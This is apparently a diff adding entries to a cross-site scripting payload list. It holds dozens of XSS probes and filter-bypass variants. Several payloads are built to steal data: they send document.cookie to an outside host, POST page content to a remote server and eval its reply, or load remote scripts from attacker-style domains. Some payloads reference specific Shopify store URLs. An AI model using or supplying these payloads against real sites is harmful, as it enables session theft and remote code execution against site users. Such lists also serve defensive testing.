@@ -1,3 +1,4 @@
+\"><%53Vg/%4FNLOaD%64=%61ler%26%23116;("document.cookie")%3E
 abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
 %3Csvg%20onpointerenter=z=alert,z(document.domain)%3E
 javascript:prompt(document.cookie)//
@@ -96,6 +97,26 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==
 <img src="x:? title=" onerror=alert(1)//">
 ";document.write('<img sr'%2b'c=http://p42.us/x.png?'%2bdocument['cookie']%2b'>');"
 <b "<script>alert(1)</script>">hola</b> 
+data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4 // "></script></title><script>alert(document.domain)</script> // <svg/onload=throw/**/Uncaught=window.onerror=eval,&quot;;alert\501\51&quot;>
+data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4 // "></script></title><script>alert(document.domain)</script> // <svg/onload=throw/**/Uncaught=window.onerror=eval,&quot;;alert\501\51&quot;>
+"args":
+"><script src=//x4.wtf></script>
+<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
+     <em> <strong> (name_product) </strong></em></span> </h4> </div>
+xss"><!--><svg/onload=alert(document.domain)>
 
+=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
 
+https://wholesale.shopify.com/asd%27%3Balert%28%27XSS%27%29%3B%27
+// # "><svg/onload=prompt(1)>
+<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
+?v0sjx'-alert(1)-'uyvvr=1
+<img src=1111111><img src=1111111><a href="javascript:alert&#40/1/&#41">axxx</a><svg></svg><img src=1>
+javascript:alert(1)//https://dqdqdqdqdq.myshopify.com
 
+<div align =" center "data-mce-fragment =" 1 "> <img src = x onerror = prompt (document.cookie)> <h4 dir = "ltr" data-mce-fragment = "1"> <span style = "text-decoration: underline; color: # ff2a00;"> <em> <strong> (name_product) </strong></em></span> </h4> </div>
+&lt;img alt=&quot;&lt;x&quot; title=&quot;/&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;
+<svg onload='new Function`["_Y000!_"].find(al\u0065rt)`'>
+')*alert(1)*v.SS('.mp4
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+?age=19;location=/javascript:alert%25281%2529/.source; :>
